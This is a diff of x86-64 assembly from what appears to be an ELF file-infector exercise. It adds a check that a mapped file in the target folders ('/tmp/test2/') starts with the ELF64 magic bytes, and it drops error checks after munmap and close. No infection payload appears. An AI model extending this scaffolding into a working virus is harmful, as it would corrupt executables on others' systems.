@@ -242,6 +242,12 @@ treat_file:
 	je .close_err					; 	goto .close_err
 	mov [mappedfile], rax				; mappedfile = _ret;
 
+	; Check if file is an ELF 64
+	mov rdi, [mappedfile]				; is_elf_64(mappedfile);
+	call is_elf_64					; ...
+	cmp rax, 1					; if (is_elf_64(mappedfile) != 1)
+	jne .unmap_err					; 	goto .unmap_err
+
 
 	jmp .unmap_file
 
@@ -259,8 +265,7 @@ treat_file:
 	mov rdi, [mappedfile]				; 	mappedfile,
 	mov rsi, [filesize]				; 	filesize
 	syscall						; );
-	cmp rax, -1					; if (_ret == -1)
-	je .close_file					; 	goto .close_file
+	jmp .close_file					; goto .close_file
 
 ; TODO Delete this
 .close_err:
@@ -275,9 +280,7 @@ treat_file:
 	mov rax, SYS_CLOSE				; _ret = close(
 	mov rdi, [fd]					;	fd
 	syscall						; );
-	cmp rax, -1					; if (_ret == -1)
-	je .err						; 	goto .err
-	jmp .end					; else goto end
+	jmp .end					; goto end
 
 ; TODO Delete this
 .err:
@@ -292,6 +295,28 @@ treat_file:
 	pop rbp
 	%pop
 	ret
+
+; int is_elf_64(char const *file_map);
+; rax is_elf_64(rdi file_map);
+is_elf_64:
+	mov rsi, 0					; counter = 0;
+	.begin_magic_loop:				; while (true) {
+		mov al, [rdi + rsi]			; 	_c = file_map[counter];
+		mov bl, [elf_64_magic + rsi]		; 	_magic_c = elf_64_magic[counter];
+		cmp al, bl				; 	if (_c != _magic_c)
+		jne .end_not_equal			; 		goto end_not_equal;
+		inc rsi					; 	counter++;
+		cmp rsi, len_elf_64_magic		; 	if (counter == len_elf_64_magic)
+		je .end_equal				; 		goto end_equal;
+		jmp .begin_magic_loop			; }
+	
+	.end_not_equal:
+		xor rax, rax				; return 0;
+		ret
+
+	.end_equal:
+		mov rax, 1				; return 1;
+		ret
 
 ; DEBUG
 ; void print_string(char const *str);
@@ -330,3 +355,5 @@ section .data
 	infected_folder_2: db "/tmp/test2/", 0
 	err_msg: db "Error occured !", 10
 	len_err_msg: equ $ - err_msg
+	elf_64_magic: db 0x7F, "ELF", 2, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0
+	len_elf_64_magic: equ $ - elf_64_magic
